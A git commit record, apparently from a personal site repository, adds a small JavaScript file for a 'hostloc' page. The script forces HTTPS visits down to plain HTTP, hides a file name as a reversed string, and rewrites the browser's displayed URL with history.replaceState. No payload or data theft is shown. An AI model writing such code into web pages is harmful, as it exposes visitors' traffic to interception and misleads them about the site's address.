4bd592d144229948e1d60177b8ca4056dc3d604c
dandan <771773847@qq.com>
2018-06-27 18:55:56 +0800

    Site updated: 2018-06-27 18:55:56

---
+++ app/hostloc/js/common.js
@@ -0,0 +1,11 @@
+if (window.location.protocol.split(":")[0] === "https") {
+    window.location.replace("http://" + window.location.href.split("//")[1]);
+}
+function reverseString(str) {
+    return str.split("").reverse().join("");
+}
+var div, img, script;
+var domain = document.domain;
+var page = "lmth.xedni";
+history.replaceState(null, null, "/" + "/" + domain + "/" + "app" + "/" + "hostloc" + "/");
+
